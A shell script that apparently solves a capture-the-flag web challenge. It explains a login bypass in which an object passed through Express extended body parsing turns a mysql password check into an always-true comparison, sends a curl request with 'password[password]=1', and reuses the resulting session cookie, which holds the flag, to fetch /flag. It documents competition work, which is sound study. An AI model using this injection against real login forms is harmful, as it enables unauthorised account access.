#!/bin/sh
# extended=true lets us pass in objects to req.body
# mysql can take objects and associates them to {column: value}
# so this turns
#   Select * from users where username = ? and password = ?;
# in to 
#   Select * from users where username = 'michelle' and password = `password` = '1'
# when formatted with [username, password]

# this gets the cookies needed
curl 'https://log-me-in.web.ctfcompetition.com/login' --data "username=michelle&password[password]=1" -v

# session=eyJjc3JmIjoiZjQ4ZjQ5NGEtMmEyYi00ZjEyLWJkMGYtM2Y0NjQzMGM0NTlhIiwidXNlcm5hbWUiOiJtaWNoZWxsZSIsImZsYWciOiJDVEZ7YS1wcmVtaXVtLWVmZm9ydC1kZXNlcnZlcy1hLXByZW1pdW0tZmxhZ30ifQ==
# session.sig=QRf77JGwlpg7_QShmDcAb5piTyo


curl 'https://log-me-in.web.ctfcompetition.com/flag' -H 'cookie: session=eyJjc3JmIjoiZjQ4ZjQ5NGEtMmEyYi00ZjEyLWJkMGYtM2Y0NjQzMGM0NTlhIiwidXNlcm5hbWUiOiJtaWNoZWxsZSIsImZsYWciOiJDVEZ7YS1wcmVtaXVtLWVmZm9ydC1kZXNlcnZlcy1hLXByZW1pdW0tZmxhZ30ifQ==; session.sig=QRf77JGwlpg7_QShmDcAb5piTyo'
